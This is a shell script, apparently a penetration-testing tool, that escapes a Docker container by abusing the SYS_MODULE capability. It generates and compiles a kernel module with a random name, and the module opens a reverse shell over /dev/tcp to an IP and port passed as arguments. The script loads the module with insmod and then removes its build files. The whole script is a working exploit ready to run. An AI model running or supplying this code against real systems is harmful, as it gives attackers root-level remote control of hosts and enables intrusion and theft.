#!/bin/sh

ip=$1
port=$2

exploitSysModule(){
  echo "[i] Exploiting SYS_MODULE"
  echo $ip
  echo $port


  if ! [ -x "$(command -v make)" ]; then
    echo "[!] make is required to run this exploit."
    exit 1
  fi

  if ! [ -x "$(command -v insmod)" ]; then
    echo "[!] insmod is required to run this exploit."
    exit 1
  fi

  if ! [ -d "/lib/modules/$(uname -r)" ]; then
    echo "[!] Linux headers for $(uname -r) are required to run this exploit."
    exit 1
  fi

  if ! [ -d "$(readlink -f  /lib/modules/$(uname -r)/build)" ]; then
    echo "$(readlink -f  /lib/modules/$(uname -r)/build) are required to run this exploit."
    exit 1
  fi

  if ! [ -d "$(dirname $(readlink -f $(readlink -f  /lib/modules/$(uname -r)/build)/Makefile))" ]; then
    echo "$(dirname $(readlink -f $(readlink -f  /lib/modules/$(uname -r)/build)/Makefile)) are required to run this exploit."
    exit 1
  fi


#  if [ -z "$ip" ]; then
#    echo "[!] Missing reverse shell IP"
#    exit 1
#  fi
#
#  if [ -z "$port" ]; then
#    echo "[!] Missing reverse shell port"
#    exit 1
#  fi

  module_name=$(tr -dc A-Za-z </dev/urandom | head -c 13)
  sys_cwd=$(pwd)

  mkdir /dev/shm/rev && cd /dev/shm/rev || exit 1

  echo "[i] Writing scripts..."

  # POC modified from https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
cat << EOF > "$module_name.c"
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/$ip/$port 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init ${module_name}_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit ${module_name}_exit(void) {
}
module_init(${module_name}_init);
module_exit(${module_name}_exit);
EOF

cat << EOF > Makefile
obj-m +=${module_name}.o
all:
	make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
clean:
	make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
EOF

  echo "[+] Done"

  echo "[i] Compiling kernel module..."

  if make 1>/dev/null ; then
    echo "[+] Done"
  else
    echo "[!] Failed to make. Do you have all the required libraries installed?"
    exit 1
  fi

  echo "[i] Mounting kernel module..."

  if insmod "$module_name.ko" 1>/dev/null ; then
    echo "[+] Done"
  else
    echo "[!] Failed to mount module"
    exit 1
  fi

  echo "[i] Cleaning up..."

  rm -r /dev/shm/rev

  cd "$sys_cwd" || exit

  echo "[+] Done"

  echo "[+] Check your reverse shell handler!"

}

exploitSysModule
